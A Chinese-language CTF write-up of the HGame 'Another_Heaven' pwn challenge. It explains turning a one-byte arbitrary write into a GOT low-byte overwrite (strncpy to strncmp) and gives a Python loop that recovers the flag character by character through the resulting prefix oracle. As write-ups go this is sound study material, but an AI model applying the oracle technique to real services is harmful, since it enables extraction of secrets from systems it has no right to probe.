# Another_Heaven

## 题目简述

程序在正常业务逻辑之外保留了一个后门：攻击者可以指定任意地址，并向该地址写入 1 个字节。服务端关闭了直接回显，因此常规 getshell 不能直接读出 flag。官方解法把这一字节写转化为字符串比较 oracle，再逐字节恢复 flag。

## 解题过程

反编译后可以看到类似逻辑：

```c
address = read_integer();
read(0, (void *)address, 1);
```

先检查导入函数的 PLT/GOT 地址。题目所用 libc 中，`strncpy` 与 `strncmp` 的地址低字节不同而高位相同，因此只改 GOT 表项最低字节，就能让原本的复制调用变成前缀比较。具体目标地址和写入字节依赖题目二进制及远端 libc，应从附件中计算，不能照抄其他环境的常量。

随后走到用户名检查逻辑，提交已知的固定字段，并把待测 flag 前缀送入被替换后的比较位置。若前缀正确，程序会进入包含 `System` 字样的分支；否则进入另一分支。由此可对每一位枚举可打印字符：

```python
alphabet = bytes(range(0x20, 0x7f))
known = b"hgame{"

while not known.endswith(b"}"):
    for candidate in alphabet:
        io = start()
        trigger_one_byte_got_patch(io)
        reach_prefix_check(io, known + bytes([candidate]))
        response = io.recvall(timeout=1)
        if b"System" in response:
            known += bytes([candidate])
            print(known)
            break
    else:
        raise RuntimeError("当前位未找到候选字符")
```

每次连接只测试一个候选字符，命中后固定该位并继续下一位，直到读到 `}`。原 PDF 中脚本所用的远端地址、端口和固定凭据只服务于当时实例，归档时不再保留为可用基础设施信息。

## 方法总结

- 核心技巧：把任意地址单字节写用于 GOT 低字节改写，将无回显服务改造成前缀比较 oracle。
- 识别信号：存在一字节任意写，但同一模块内两个函数地址仅低位不同时，应优先检查 partial overwrite。
- 复用要点：oracle 的成功条件必须稳定可区分；地址、函数低字节和响应标志都要在目标环境中重新确认。

> 外部分析补足了原 PDF 对后门伪代码和 OEP 分析的说明；利用步骤已完整消化到正文。参考：[HGame 第二周 RE/PWN 复盘](https://blog.51cto.com/u_14601424/6839391)。
